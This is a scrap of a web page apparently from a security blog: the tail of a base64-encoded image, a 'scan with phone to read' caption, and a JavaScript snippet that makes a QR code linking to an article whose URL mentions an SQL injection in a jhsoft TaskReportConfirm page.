VVfqQepB96Qmes08fUJNtldWD6vJzjAPx1ehZ8X60hf0vGr2RwtW3j2P3hXbU2tzIVU84/fdgc1vez1KnoTALYb3auqV0xuoJQ7Mw5kZRA+iBdE6olfEHzzSUo+vw/mpV6iHe48+dfNw13oeT8fKc74h/S69OZ+/XPQcq61Zk/P0BOYrTj3oNeeHey3+ILWO6EHvqXnqgb3WogXmlaMH9lSOXlH79mL91s3DXTOvfL4h9W58QDwXkg2usDpjfYoSH3msOds8nN7AWuLAvHL0IH0V1aOuZi6rhzOrQs+K9VlL/x70HLHznFG9cyFVPOP33YH5tyy3Jh8dqW+25+nt2tHco1pmVThXrrW9+DvzVzO+cy37Vz3PnON8Q7yDH8LnQg4X8fri5q+9HsHXq3KvmT/DvsIr7v1es+s117Pi6tuL+zn0VV3tGV6dI1rtdbZa6oF5+HxDchc+CPOHutv7Dn/n68iTENSe5MHeNat3L6693ZPZgZ7EontXnj1v7625c6pm7Dw9svXw+YbkLnwQ5kLc3jP8zPn7nNXT0LXe893rdH+f3+vJ+zXtqRxfoGZPtI6jWu9feedC+uAzf88d2CzELa5474irTXfvyqMm7/Wk7nn0mK9YT/oC8+qNHliTo4mumTvHPKzWOTXR53Y99c1CNJ38njtwLuQ99333qi9fSF5LcfR658S1nnwFZ4WtJw7Mj9hr6DEPZ0aQOEgc6K0cfYXqyYxALXHHyxfiYU5e34FfWYhbrpdQO2L9Plndaz2sR472CM5b+XrN3PnhVV+01ILEP4HXWvX+ykJWg0/tZ3dgs5Bsfg97l9Dv5sN6ra1YT/yB+Xe86RP2m/c51sPWEj8L5z7jX3m95hFvFvLMxU7PP3cH5kLc6DO8d5y6+T3PSrfPmmcwD3fNniO2R84coWa/+hHr7b3Re1+0Dvu6Vz08F9JNZ/6eO3Au5D33ffeq/wUAAP//Yu72ewAAAAZJREFUAwCOOD+JXSYP9gAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/jhsoft-TaskReportConfirm-id-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 